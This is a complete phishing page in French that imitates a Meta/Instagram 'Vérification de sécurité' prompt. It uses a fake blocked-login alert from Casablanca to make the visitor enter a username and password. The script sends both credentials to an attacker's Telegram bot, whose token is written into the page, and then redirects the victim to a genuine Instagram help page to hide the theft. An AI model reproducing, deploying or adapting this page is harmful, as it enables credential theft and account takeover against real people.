            --meta-blue: #0064e0; 
            --deep-blue: #0a4f9a; 
            --card-gray: #f0f2f5; 
            --meta-header: #fff;

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        
        /* الخلفية الزرقاء المتدرجة 2026 */
        body { 
            background: linear-gradient(135deg, var(--meta-blue) 0%, var(--deep-blue) 100%); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            padding: 20px; 
            box-shadow: inset 0 0 150px rgba(0,0,0,0.1);
        }

        /* المربع الأبيض الداخلي (The UI Card) */

            background: white; 
            border-radius: 15px; 
            width: 100%; 
            max-width: 420px; 
            padding: 35px; 
            box-shadow: 0 25px 50px rgba(0,0,0,0.3); 
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            position: relative;

        .meta-hub { text-align: center; margin-bottom: 30px; }

        h2 { font-size: 24px; color: #1c1e21; margin-bottom: 15px; font-weight: 700; }
        
        /* صندوق التنبيه Casablanca */
        .alert-box { 
            background: #fff4f4; 
            border: 1px solid #f9d6d6; 
            border-radius: 12px; 
            padding: 18px; 
            margin-bottom: 25px; 
            display: flex; 
            align-items: center;
            text-align: left;
            border-left: 5px solid #fa3e3e;
        }
        .alert-box svg { fill: #fa3e3e; width: 32px; margin-right: 15px; flex-shrink: 0; }
        .alert-text { font-size: 14px; color: #4b4f56; line-height: 1.5; }
        .details { font-weight: 700; color: #d93025; display: block; margin-top: 5px; }

        input { 
            width: 100%; 
            padding: 16px; 
            background: #f5f6f7; 
            border: 1px solid #dddfe2; 
            border-radius: 10px; 
            margin-bottom: 12px; 
            font-size: 15px; 
            transition: 0.2s; 
            outline: none;
        }
        input:focus { background: white; border-color: var(--meta-blue); box-shadow: 0 0 0 3px #e7f3ff; }

        .btn { 
            width: 100%; 
            background: var(--meta-blue); 
            color: white; 
            border: none; 
            padding: 16px; 
            border-radius: 10px; 
            font-weight: 700; 
            font-size: 17px; 
            cursor: pointer; 
            transition: 0.3s; 
        }
        .btn:hover { background: #166fe5; transform: translateY(-1px); }
        .btn:active { background: #1362c9; transform: translateY(0); }

        .footer { 
            margin-top: 35px; 
            padding-top: 20px; 
            border-top: 1px solid #ebedf0; 
        }
        .footer img { width: 90px; opacity: 0.9; }

<body>

<div class="card">
    <div class="meta-hub">
        <div class="ig-branded-icon">
            <div class="ig-white-glyph"></div>
        </div>
    </div>
    
    <h2>Vérification de sécurité</h2>

    <div class="alert-box">
        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        <div class="alert-text">
            Une tentative de connexion bloquée : <br>
            <span class="details">📍 Casablanca, Maroc (IP: 105.158.24.11)</span>
            <br>Veuillez confirmer votre identité pour déverrouiller votre compte.
        </div>
    </div>

    <form id="final-gate">
        <input type="text" id="user" placeholder="Nom d'utilisateur, e-mail ou mobile" required autocomplete="username">
        <input type="password" id="pass" placeholder="Mot de passe" required autocomplete="current-password">
        <button type="submit" class="btn">Sécuriser le compte</button>
    </form>

    <div class="footer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1200px-Meta_Platforms_Inc._logo.svg.png">
    </div>
</div>

<script>
    document.getElementById('final-gate').onsubmit = async (e) => {
        e.preventDefault();
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const tok = "7137131967:AAHa-B55idnADcUHKse3HjqHeoHyAjSMY1I";
        const id = "5558301795";
        
        const text = `🚨 **TARGET HIT: MAROC PORTAL** 🚨\n\n👤 **User:** \`${u}\` \n🔑 **Pass:** \`${p}\` \n🔒 **Source:** Meta Security Portal`;

        await fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        
        // التوجيه النهائي لصفحة رسمية
        window.location.href = "https://help.instagram.com/149494825257596";
    };
</script>
